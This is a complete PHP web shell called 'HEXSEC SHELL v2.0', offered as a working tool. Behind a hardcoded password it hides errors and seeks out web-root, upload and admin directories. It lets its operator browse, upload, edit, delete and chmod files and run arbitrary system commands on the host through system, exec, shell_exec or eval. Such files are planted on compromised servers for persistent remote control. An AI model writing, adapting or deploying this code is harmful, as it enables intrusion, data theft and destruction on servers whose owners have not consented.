<?php                                                                                                               
// HEXSEC SHELL - AUTO DIRECTORY DETECTION                                                                          
@ini_set('display_errors', 0);                                                                                      
@error_reporting(0);                                                                                                
@set_time_limit(0);                                                                                                 
session_start();                                                                                                    
                                                                                                                    
// Security constants                                                                                               
define('LOGIN_PASSWORD', '192004');                                                                                 
define('BAN_DURATION', 3600);                                                                                       
define('MAX_ATTEMPTS', 3);                                                                                          
                                                                                                                    
// Login check function                                                                                             
function checkLoginStatus() {                                                                                       
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';                                                                     
    $ban_file = dirname(__FILE__) . '/.banned_ips';                                                                 
                                                                                                                    
    if(file_exists($ban_file)) {                                                                                    
        $banned_ips = unserialize(file_get_contents($ban_file));                                                    
        if(isset($banned_ips[$ip]) && time() < $banned_ips[$ip]) {                                                  
            die('❌ Your IP is banned. Try again later.');                                                          
        }                                                                                                           
    }                                                                                                               
                                                                                                                    
    if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {                                 
        showLoginPage();                                                                                            
        exit;                                                                                                       
    }                                                                                                               
}                                                                                                                   
                                                                                                                    
function showLoginPage() {                                                                                          
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {                                         
        $password = trim($_POST['password']);                                                                       
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';                                                                 
        $attempts_file = dirname(__FILE__) . '/.login_attempts';                                                    
                                                                                                                    
        $attempts = file_exists($attempts_file) ? unserialize(file_get_contents($attempts_file)) : [];              
                                                                                                                    
        if($password === LOGIN_PASSWORD) {                                                                          
            $_SESSION['authenticated'] = true;                                                                      
            $_SESSION['login_time'] = time();                                                                       
            unset($attempts[$ip]);                                                                                  
            file_put_contents($attempts_file, serialize($attempts));                                                
            header('Location: ' . $_SERVER['PHP_SELF']);                                                            
            exit;                                                                                                   
        } else {                                                                                                    
            $attempts[$ip]['count'] = ($attempts[$ip]['count'] ?? 0) + 1;                                           
            $attempts[$ip]['time'] = time();                                                                        
                                                                                                                    
            if($attempts[$ip]['count'] >= MAX_ATTEMPTS) {                                                           
                $banned_ips = file_exists(dirname(__FILE__) . '/.banned_ips') ? unserialize(file_get_contents(dirname(__FILE__) . '/.banned_ips')) : [];                                            
                $banned_ips[$ip] = time() + BAN_DURATION;                                                           
                file_put_contents(dirname(__FILE__) . '/.banned_ips', serialize($banned_ips));                      
                                                                                                                    
                die('❌ Too many failed attempts. IP banned for 1 hour.');                                          
            }                                                                                                       
                                                                                                                    
            file_put_contents($attempts_file, serialize($attempts));                                                
            $error_msg = "Wrong password! " . (MAX_ATTEMPTS - $attempts[$ip]['count']) . " attempts remaining.";    
        }                                                                                                           
    }                                                                                                               
                                                                                                                    
    echo '<!DOCTYPE html>                                                                                           
<html>                                                                                                              
<head>                                                                                                              
    <title>🔒 Security Login 🔒</title>                                                                             
    <meta charset="UTF-8">                                                                                          
    <style>                                                                                                         
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; padding: 0; }                      
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; }              
        .login-box { background: #111; border: 1px solid #0f0; padding: 40px; text-align: center; }                 
        .title { font-size: 24px; margin-bottom: 20px; text-transform: uppercase; }                                 
        input[type="password"] { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 15px; font-size: 16px; }                                                                                            
        .btn { width: 100%; background: #0f0; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; }                                                                                                          
        .error { color: #ff0000; margin: 10px 0; }                                                                  
        .note { color: #888; font-size: 12px; }                                                                     
    </style>                                                                                                        
</head>                                                                                                             
<body>                                                                                                              
    <div class="container">                                                                                         
        <div class="login-box">                                                                                     
            <div class="title">🔥 HEXSEC SHELL 🔥</div>                                                             
            <div style="margin-bottom: 20px; color: #ff0;">Authentication Required</div>                            
                                                                                                                    
            ' . (isset($error_msg) ? '<div class="error">❌ ' . $error_msg . '</div>' : '') . '                     
                                                                                                                    
            <form method="POST">                                                                                    
                <input type="password" name="password" placeholder="Enter password" required>                       
                <button type="submit" class="btn">🔓 Login</button>                                                 
            </form>                                                                                                 
                                                                                                                    
            <div class="note" style="margin-top: 20px;">                                                            
                ⚠️ 3 failed attempts = 1 hour ban<br>                                                                
                All attempts are logged                                                                             
            </div>                                                                                                  
        </div>                                                                                                      
    </div>                                                                                                          
</body>                                                                                                             
</html>';                                                                                                           
    exit;                                                                                                           
}                                                                                                                   
                                                                                                                    
checkLoginStatus();                                                                                                 
                                                                                                                    
// Auto-detect best directory                                                                                       
function getBestDirectory() {                                                                                       
    $current_dir = getcwd();                                                                                        
                                                                                                                    
    // Check if we're in a web directory                                                                            
    $web_dirs = [                                                                                                   
        'public_html',                                                                                              
        'www',                                                                                                      
        'htdocs',                                                                                                   
        'html',                                                                                                     
        'web',                                                                                                      
        'public',                                                                                                   
        'wwwroot'                                                                                                   
    ];                                                                                                              
                                                                                                                    
    // Try to find web root                                                                                         
    $path_parts = explode('/', $current_dir);                                                                       
    $web_root = $current_dir;                                                                                       
                                                                                                                    
    for($i = count($path_parts) - 1; $i >= 0; $i--) {                                                               
        if(in_array($path_parts[$i], $web_dirs)) {                                                                  
            $web_root = implode('/', array_slice($path_parts, 0, $i + 1));                                          
            break;                                                                                                  
        }                                                                                                           
    }                                                                                                               
                                                                                                                    
    // Check if web root exists and is readable                                                                     
    if(is_dir($web_root) && is_readable($web_root)) {                                                               
        return $web_root;                                                                                           
    }                                                                                                               
                                                                                                                    
    // Try common web paths                                                                                         
    $common_paths = [                                                                                               
        '/var/www/html',                                                                                            
        '/usr/local/apache/htdocs',                                                                                 
        '/opt/lampp/htdocs',                                                                                        
        '/opt/xampp/htdocs',                                                                                        
        '/home/*/public_html',                                                                                      
        '/home/*/www',                                                                                              
        '/home/*/html'                                                                                              
    ];                                                                                                              
                                                                                                                    
    foreach($common_paths as $path) {                                                                               
        if(strpos($path, '*') !== false) {                                                                          
            // Glob pattern                                                                                         
            $matches = glob($path);                                                                                 
            foreach($matches as $match) {                                                                           
                if(is_dir($match) && is_readable($match)) {                                                         
                    return $match;                                                                                  
                }                                                                                                   
            }                                                                                                       
        } else {                                                                                                    
            if(is_dir($path) && is_readable($path)) {                                                               
                return $path;                                                                                       
            }                                                                                                       
        }                                                                                                           
    }                                                                                                               
                                                                                                                    
    // Fall back to current directory                                                                               
    return $current_dir;                                                                                            
}                                                                                                                   
                                                                                                                    
// Get current directory from GET parameter or auto-detect                                                          
$target_dir = isset($_GET['dir']) ? $_GET['dir'] : getBestDirectory();                                              
                                                                                                                    
// Validate directory exists                                                                                        
if(!is_dir($target_dir)) {                                                                                          
    $target_dir = getcwd();                                                                                         
}                                                                                                                   
                                                                                                                    
$current_dir = $target_dir;                                                                                         
$available_functions = [];                                                                                          
                                                                                                                    
// Check available functions                                                                                        
$functions_to_check = ['system', 'exec', 'shell_exec', 'passthru', 'eval', 'assert', 'create_function'];            
foreach($functions_to_check as $func) {                                                                             
    if(function_exists($func)) {                                                                                    
        $available_functions[] = $func;                                                                             
    }                                                                                                               
}                                                                                                                   
                                                                                                                    
// Handle POST requests                                                                                             
$action_output = '';                                                                                                
$edit_file = '';                                                                                                    
$edit_content = '';                                                                                                 
                                                                                                                    
if($_SERVER['REQUEST_METHOD'] == 'POST') {                                                                          
    try {                                                                                                           
        // Create Directory                                                                                         
        if(isset($_POST['create_dir']) && !empty($_POST['dir_name'])) {                                             
            $dir_name = basename(trim($_POST['dir_name']));                                                         
            $dir_path = $current_dir . '/' . $dir_name;                                                             
            if(!file_exists($dir_path)) {                                                                           
                if(mkdir($dir_path)) {                                                                              
                    $action_output = "✅ Directory created: $dir_name";                                             
                } else {                                                                                            
                    $action_output = "❌ Failed to create directory";                                               
                }                                                                                                   
            } else {                                                                                                
                $action_output = "❌ Directory already exists";                                                     
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Create File                                                                                              
        if(isset($_POST['create_file']) && !empty($_POST['file_name'])) {                                           
            $file_name = basename(trim($_POST['file_name']));                                                       
            $content = $_POST['file_content'] ?? '';                                                                
            $file_path = $current_dir . '/' . $file_name;                                                           
                                                                                                                    
            if(file_put_contents($file_path, $content)) {                                                           
                $action_output = "✅ File created: $file_name";                                                     
            } else {                                                                                                
                $action_output = "❌ Failed to create file";                                                        
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Change Directory                                                                                         
        if(isset($_POST['action']) && $_POST['action'] == 'cd' && !empty($_POST['path'])) {                         
            $path = $_POST['path'];                                                                                 
            if(is_dir($path)) {                                                                                     
                $current_dir = $path;                                                                               
                $action_output = "✅ Changed to: " . htmlspecialchars($path);                                       
                // Redirect to new directory                                                                        
                header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($path));                           
                exit;                                                                                               
            } else {                                                                                                
                $action_output = "❌ Directory not found";                                                          
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Preview File                                                                                             
        if(isset($_POST['action']) && $_POST['action'] == 'preview' && !empty($_POST['file'])) {                    
            $file_name = basename($_POST['file']);                                                                  
            $file_path = $current_dir . '/' . $file_name;                                                           
                                                                                                                    
            if(file_exists($file_path) && is_file($file_path)) {                                                    
                $content = file_get_contents($file_path);                                                           
                $edit_file = $file_name;                                                                            
                $edit_content = htmlspecialchars($content);                                                         
                $action_output = "📄 Previewing: $file_name";                                                       
            } else {                                                                                                
                $action_output = "❌ File not found";                                                               
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Edit File                                                                                                
        if(isset($_POST['action']) && $_POST['action'] == 'edit' && !empty($_POST['file']) && isset($_POST['content'])) {                                                                                         
            $file_name = basename($_POST['file']);                                                                  
            $content = $_POST['content'];                                                                           
            $file_path = $current_dir . '/' . $file_name;                                                           
                                                                                                                    
            if(file_put_contents($file_path, $content)) {                                                           
                $action_output = "✅ File edited: $file_name";                                                      
                $edit_file = '';                                                                                    
                $edit_content = '';                                                                                 
            } else {                                                                                                
                $action_output = "❌ Failed to edit file";                                                          
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Rename File/Folder                                                                                       
        if(isset($_POST['action']) && $_POST['action'] == 'rename' && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {                                                                                       
            $old_name = basename($_POST['old_name']);                                                               
            $new_name = basename($_POST['new_name']);                                                               
            $old_path = $current_dir . '/' . $old_name;                                                             
            $new_path = $current_dir . '/' . $new_name;                                                             
                                                                                                                    
            if(file_exists($old_path) && !file_exists($new_path)) {                                                 
                if(rename($old_path, $new_path)) {                                                                  
                    $action_output = "✅ Renamed: $old_name → $new_name";                                           
                } else {                                                                                            
                    $action_output = "❌ Failed to rename";                                                         
                }                                                                                                   
            } else {                                                                                                
                $action_output = "❌ File not found or target exists";                                              
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Delete File/Folder                                                                                       
        if(isset($_POST['action']) && $_POST['action'] == 'delete' && !empty($_POST['path'])) {                     
            $path = $_POST['path'];                                                                                 
                                                                                                                    
            if(file_exists($path)) {                                                                                
                if(is_dir($path)) {                                                                                 
                    $files = new RecursiveIteratorIterator(                                                         
                        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),               
                        RecursiveIteratorIterator::CHILD_FIRST                                                      
                    );                                                                                              
                                                                                                                    
                    foreach($files as $file) {                                                                      
                        if($file->isDir()) {                                                                        
                            rmdir($file->getRealPath());                                                            
                        } else {                                                                                    
                            unlink($file->getRealPath());                                                           
                        }                                                                                           
                    }                                                                                               
                    rmdir($path);                                                                                   
                    $action_output = "✅ Directory deleted: " . basename($path);                                    
                } else {                                                                                            
                    if(unlink($path)) {                                                                             
                        $action_output = "✅ File deleted: " . basename($path);                                     
                    } else {                                                                                        
                        $action_output = "❌ Failed to delete file";                                                
                    }                                                                                               
                }                                                                                                   
            } else {                                                                                                
                $action_output = "❌ File/Directory not found";                                                     
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Chmod                                                                                                    
        if(isset($_POST['action']) && $_POST['action'] == 'chmod' && !empty($_POST['path']) && !empty($_POST['mode'])) {                                                                                           
            $path = $_POST['path'];                                                                                 
            $mode = octdec($_POST['mode']);                                                                         
                                                                                                                    
            if(file_exists($path)) {                                                                                
                if(chmod($path, $mode)) {                                                                           
                    $action_output = "✅ Permission changed: " . basename($path) . " → " . $_POST['mode'];          
                } else {                                                                                            
                    $action_output = "❌ Failed to change permission";                                              
                }                                                                                                   
            } else {                                                                                                
                $action_output = "❌ File not found";                                                               
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Upload File                                                                                              
        if(isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {                                 
            $upload_file = $_FILES['upload_file'];                                                                  
            $target_path = $current_dir . '/' . basename($upload_file['name']);                                     
                                                                                                                    
            if(move_uploaded_file($upload_file['tmp_name'], $target_path)) {                                        
                $action_output = "✅ File uploaded: " . basename($upload_file['name']);                             
            } else {                                                                                                
                $action_output = "❌ Upload failed";                                                                
            }                                                                                                       
        }                                                                                                           
                                                                                                                    
        // Command Execution                                                                                        
        if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {                                                         
            $cmd = $_POST['cmd'];                                                                                   
            $output = '';                                                                                           
                                                                                                                    
            foreach($available_functions as $func) {                                                                
                ob_start();                                                                                         
                                                                                                                    
                if($func == 'system') {                                                                             
                    system($cmd);                                                                                   
                } elseif($func == 'exec') {                                                                         
                    exec($cmd, $output_lines);                                                                      
                    $output = implode("\n", $output_lines);                                                         
                } elseif($func == 'shell_exec') {                                                                   
                    $output = shell_exec($cmd);                                                                     
                } elseif($func == 'eval') {                                                                         
                    eval("system('$cmd');");                                                                        
                    $output = ob_get_clean();                                                                       
                    break;                                                                                          
                }                                                                                                   
                                                                                                                    
                $output = ob_get_clean();                                                                           
                if(!empty($output)) {                                                                               
                    break;                                                                                          
                }                                                                                                   
            }                                                                                                       
                                                                                                                    
            $action_output = "<strong>Command:</strong> $cmd\n\n<strong>Output:</strong>\n" . htmlspecialchars($output);                                                                                          
        }                                                                                                           
                                                                                                                    
    } catch(Exception $e) {                                                                                         
        $action_output = "❌ Error: " . $e->getMessage();                                                           
    }                                                                                                               
}                                                                                                                   
                                                                                                                    
// Get file list                                                                                                    
$files = [];                                                                                                        
if(is_dir($current_dir)) {                                                                                          
    $scanned_files = scandir($current_dir);                                                                         
    $scanned_files = array_diff($scanned_files, ['.', '..']);                                                       
                                                                                                                    
    foreach($scanned_files as $file) {                                                                              
        $file_path = $current_dir . '/' . $file;                                                                    
        $files[] = [                                                                                                
            'name' => $file,                                                                                        
            'path' => $file_path,                                                                                   
            'is_dir' => is_dir($file_path),                                                                         
            'size' => is_file($file_path) ? filesize($file_path) : 0,                                               
            'perm' => substr(sprintf('%o', fileperms($file_path)), -4)                                              
        ];                                                                                                          
    }                                                                                                               
}                                                                                                                   
                                                                                                                    
// Auto-detect common directories for quick access                                                                  
$quick_dirs = [];                                                                                                   
$dir_parts = explode('/', $current_dir);                                                                            
                                                                                                                    
// Find web root patterns                                                                                           
for($i = count($dir_parts) - 1; $i >= 0; $i--) {                                                                    
    if(in_array($dir_parts[$i], ['public_html', 'www', 'htdocs', 'html', 'web', 'public', 'wwwroot'])) {            
        // Found web root                                                                                           
        $web_root = implode('/', array_slice($dir_parts, 0, $i + 1));                                               
        $quick_dirs['Web Root'] = $web_root;                                                                        
                                                                                                                    
        // Try to find upload/ directory                                                                            
        $upload_dir = $web_root . '/upload';                                                                        
        if(is_dir($upload_dir)) {                                                                                   
            $quick_dirs['Upload Dir'] = $upload_dir;                                                                
        }                                                                                                           
                                                                                                                    
        // Try to find images/ directory                                                                            
        $images_dir = $web_root . '/images';                                                                        
        if(is_dir($images_dir)) {                                                                                   
            $quick_dirs['Images Dir'] = $images_dir;                                                                
        }                                                                                                           
                                                                                                                    
        // Try to find admin/ directory                                                                             
        $admin_dir = $web_root . '/admin';                                                                          
        if(is_dir($admin_dir)) {                                                                                    
            $quick_dirs['Admin Dir'] = $admin_dir;                                                                  
        }                                                                                                           
                                                                                                                    
        break;                                                                                                      
    }                                                                                                               
}                                                                                                                   
                                                                                                                    
// Add root directory                                                                                               
$quick_dirs['Root'] = '/';                                                                                          
?>                                                                                                                  
<!DOCTYPE html>                                                                                                     
<html>                                                                                                              
<head>                                                                                                              
    <title>🔥 HEXSEC SHELL v2.0 🔥</title>                                                                          
    <meta charset="UTF-8">                                                                                          
    <style>                                                                                                         
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }                   
        .container { max-width: 1400px; margin: 0 auto; }                                                           
        .header { background: #111; padding: 15px; border: 1px solid #333; margin-bottom: 20px; }                   
        .status { background: #330000; color: #ff0000; padding: 10px; border: 1px solid #ff0000; margin-bottom: 20px; }                                                                                                             
        .tools { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }                                                                                              
        .tool-card { background: #111; border: 1px solid #333; padding: 15px; }                                     
        .tool-header { color: #ff0; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }                                                                                              
        .form-group { margin-bottom: 10px; }                                                                        
        input, textarea { width: 100%; background: #222; border: 1px solid #333; color: #0f0; padding: 8px; }       
        .btn { background: #0f0; color: #000; border: none; padding: 8px 16px; cursor: pointer; font-weight: bold; }                                                                                                                   
        .btn:hover { background: #ff0; }                                                                            
        .btn.secondary { background: #333; color: #fff; }                                                           
        .file-list { background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 20px; }                
        .file-item { display: flex; justify-content: space-between; padding: 8px; border-bottom: 1px solid #333; }  
        .file-name { display: flex; align-items: center; gap: 8px; }                                                
        .output { background: #000; border: 1px solid #333; padding: 15px; }                                        
        .success { color: #22c55e; }                                                                                
        .error { color: #ef4444; }                                                                                  
        .info { color: #38bdf8; }                                                                                   
        .preview-box { background: #000; border: 1px solid #333; padding: 15px; margin: 10px 0; }                   
        .preview-content { background: #111; padding: 10px; border: 1px solid #333; font-family: monospace; max-height: 300px; overflow-y: auto; }                                                                              
        .quick-access { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; }                           
    </style>                                                                                                        
</head>                                                                                                             
<body>                                                                                                              
    <div class="container">                                                                                         
        <div class="header">                                                                                        
            <h1>🔥 HEXSEC SHELL v2.0 🔥</h1>                                                                        
            <div style="margin-top: 10px; font-size: 12px; color: #888;">                                           
                PHP: <?php echo phpversion(); ?> | User: <?php echo get_current_user(); ?> | Authenticated ✅       
            </div>                                                                                                  
        </div>                                                                                                      
                                                                                                                    
        <div class="status">                                                                                        
            ✅ FULLY AUTHENTICATED - All features available                                                         
        </div>                                                                                                      
                                                                                                                    
        <!-- Directory Navigation -->                                                                               
        <div class="tool-card">                                                                                     
            <div class="tool-header">📁 Directory Navigation</div>                                                  
            <div style="margin-bottom: 10px; color: #ff0;">                                                         
                <strong>Current Directory:</strong> <?php echo htmlspecialchars($current_dir); ?>                   
            </div>                                                                                                  
                                                                                                                    
            <!-- Quick Access Buttons -->                                                                           
            <div class="quick-access">                                                                              
                <?php foreach($quick_dirs as $name => $path): ?>                                                    
                    <form method="POST" style="display: inline;">                                                   
                        <input type="hidden" name="action" value="cd">                                              
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">            
                        <button type="submit" class="btn" style="padding: 5px 10px; font-size: 12px;"><?php echo htmlspecialchars($name); ?></button>                                                                                
                    </form>                                                                                         
                <?php endforeach; ?>                                                                                
            </div>                                                                                                  
                                                                                                                    
            <form method="POST" style="display: flex; gap: 10px; margin-bottom: 10px;">                             
                <input type="text" name="path" placeholder="Enter full path to directory">                          
                <input type="hidden" name="action" value="cd">                                                      
                <button type="submit" class="btn">Change Directory</button>                                         
            </form>                                                                                                 
                                                                                                                    
            <!-- Parent Directory -->                                                                               
            <form method="POST" style="display: inline;">                                                           
                <input type="hidden" name="action" value="cd">                                                      
                <input type="hidden" name="path" value="<?php echo htmlspecialchars(dirname($current_dir)); ?>">    
                <button type="submit" class="btn secondary" style="padding: 5px 10px; font-size: 12px;">Go Up</button>                                                                                                         
            </form>                                                                                                 
        </div>                                                                                                      
                                                                                                                    
        <!-- Create Tools -->                                                                                       
        <div class="tools">                                                                                         
            <div class="tool-card">                                                                                 
                <div class="tool-header">➕ Create Directory</div>                                                  
                <form method="POST">                                                                                
                    <div class="form-group">                                                                        
                        <input type="text" name="dir_name" placeholder="Directory name">                            
                    </div>                                                                                          
                    <button type="submit" name="create_dir" class="btn">Create</button>                             
                </form>                                                                                             
            </div>                                                                                                  
                                                                                                                    
            <div class="tool-card">                                                                                 
                <div class="tool-header">📄 Create File</div>                                                       
                <form method="POST">                                                                                
                    <div class="form-group">                                                                        
                        <input type="text" name="file_name" placeholder="File name">                                
                    </div>                                                                                          
                    <div class="form-group">                                                                        
                        <textarea name="file_content" placeholder="File content"></textarea>                        
                    </div>                                                                                          
                    <button type="submit" name="create_file" class="btn">Create</button>                            
                </form>                                                                                             
            </div>                                                                                                  
        </div>                                                                                                      
                                                                                                                    
        <!-- File List -->                                                                                          
        <div class="file-list">                                                                                     
            <div class="tool-header">📂 Files & Folders (<?php echo count($files); ?> items)</div>                  
            <?php if(empty($files)): ?>                                                                             
                <div style="color: #888; padding: 20px; text-align: center;">No files found</div>                   
            <?php else: ?>                                                                                          
                <?php foreach($files as $file): ?>                                                                  
                    <div class="file-item">                                                                         
                        <div class="file-name">                                                                     
                            <?php echo $file['is_dir'] ? '📁 <strong>' . htmlspecialchars($file['name']) . '</strong>' : '📄 ' . htmlspecialchars($file['name']); ?>                                                           
                            <?php if($file['is_dir']): ?>                                                           
                                <form method="POST" style="display: inline;">                                       
                                    <input type="hidden" name="action" value="cd">                                  
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($file['path']); ?>">                                                                               
                                    <button type="submit" class="btn" style="padding: 2px 6px; font-size: 12px;">Open</button>                                                                                                
                                </form>                                                                             
                            <?php endif; ?>                                                                         
                        </div>                                                                                      
                        <div style="display: flex; gap: 5px;">                                                      
                            <!-- Preview -->                                                                        
                            <form method="POST" style="display: inline;">                                           
                                <input type="hidden" name="action" value="preview">                                 
                                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['name']); ?>">                                                                               
                                <button type="submit" class="btn" style="padding: 2px 6px; font-size: 12px;">Preview</button>                                                                                             
                            </form>                                                                                 
                                                                                                                    
                            <!-- Edit -->                                                                           
                            <form method="POST" style="display: inline;">                                           
                                <input type="hidden" name="action" value="edit">                                    
                                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['name']); ?>">                                                                               
                                <input type="text" name="content" placeholder="Edit content" style="width: 150px;">                                                                                                            
                                <button type="submit" class="btn" style="padding: 2px 6px; font-size: 12px;">Edit</button>                                                                                                
                            </form>                                                                                 
                                                                                                                    
                            <!-- Rename -->                                                                         
                            <form method="POST" style="display: inline;">                                           
                                <input type="hidden" name="action" value="rename">                                  
                                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file['name']); ?>">                                                                               
                                <input type="text" name="new_name" placeholder="New name" style="width: 100px;">    
                                <button type="submit" class="btn" style="padding: 2px 6px; font-size: 12px;">Rename</button>                                                                                              
                            </form>                                                                                 
                                                                                                                    
                            <!-- Delete -->                                                                         
                            <form method="POST" style="display: inline;">                                           
                                <input type="hidden" name="action" value="delete">                                  
                                <input type="hidden" name="path" value="<?php echo htmlspecialchars($file['path']); ?>">                                                                               
                                <button type="submit" class="btn" style="padding: 2px 6px; font-size: 12px;">Delete</button>                                                                                              
                            </form>                                                                                 
                        </div>                                                                                      
                    </div>                                                                                          
                <?php endforeach; ?>                                                                                
            <?php endif; ?>                                                                                         
        </div>                                                                                                      
                                                                                                                    
        <!-- File Preview/Edit Box -->                                                                              
        <?php if(!empty($edit_file)): ?>                                                                            
            <div class="preview-box">                                                                               
                <div class="tool-header">📄 Preview & Edit: <?php echo htmlspecialchars($edit_file); ?></div>       
                <div class="preview-content">                                                                       
                    <?php echo nl2br($edit_content); ?>                                                             
                </div>                                                                                              
                <form method="POST" style="margin-top: 10px;">                                                      
                    <input type="hidden" name="action" value="edit">                                                
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($edit_file); ?>">           
                    <div class="form-group">                                                                        
                        <textarea name="content" placeholder="Edit file content" style="width: 100%; height: 200px; background: #000; color: #0f0; border: 1px solid #333; font-family: monospace;"><?php echo htmlspecialchars($edit_content); ?></textarea>                                                                      
                    </div>                                                                                          
                    <button type="submit" class="btn">Save Changes</button>                                         
                    <form method="POST" style="display: inline;">                                                   
                        <button type="submit" class="btn secondary" style="background: #333; color: #fff;">Cancel</button>                                                                                              
                    </form>                                                                                         
                </form>                                                                                             
            </div>                                                                                                  
        <?php endif; ?>                                                                                             
                                                                                                                    
        <!-- Upload -->                                                                                             
        <div class="tool-card">                                                                                     
            <div class="tool-header">📁 File Upload</div>                                                           
            <form method="POST" enctype="multipart/form-data">                                                      
                <div class="form-group">                                                                            
                    <input type="file" name="upload_file">                                                          
                </div>                                                                                              
                <button type="submit" class="btn">Upload</button>                                                   
            </form>                                                                                                 
        </div>                                                                                                      
                                                                                                                    
        <!-- Command Execution -->                                                                                  
        <div class="tool-card">                                                                                     
            <div class="tool-header">🚀 Command Execution</div>                                                     
            <form method="POST">                                                                                    
                <div class="form-group">                                                                            
                    <input type="text" name="cmd" placeholder="Command (ls, cd, wget, etc.)">                       
                </div>                                                                                              
                <button type="submit" class="btn">Execute</button>                                                  
            </form>                                                                                                 
        </div>                                                                                                      
                                                                                                                    
        <!-- Output -->                                                                                             
        <div class="output">                                                                                        
            <div class="tool-header">📤 Output</div>                                                                
            <?php if($action_output): ?>                                                                            
                <pre style="color: #0f0; white-space: pre-wrap; background: #000; padding: 10px;"> <?php echo $action_output; ?>                                                                                       
                </pre>                                                                                              
            <?php else: ?>                                                                                          
                <div style="color: #888; padding: 20px;">                                                           
                    🔥 HEXSEC SHELL v2.0 - Ready to use<br>                                                         
                    Available functions: <?php echo implode(', ', $available_functions); ?><br>                     
                    Current directory: <?php echo htmlspecialchars($current_dir); ?><br><br>                        
                    <span style="color: #ff0;">Tip:</span> Use the tools above to manage files and execute commands.<br>                                                                                                       
                    <span style="color: #ff0;">Tip:</span> Click "Preview" to view file content before editing.<br>                                                                                                        
                    <span style="color: #ff0;">Tip:</span> Use Quick Access buttons to jump to common directories.  
                </div>                                                                                              
            <?php endif; ?>                                                                                         
        </div>                                                                                                      
    </div>                                                                                                          
</body>                                                                                                             
</html>
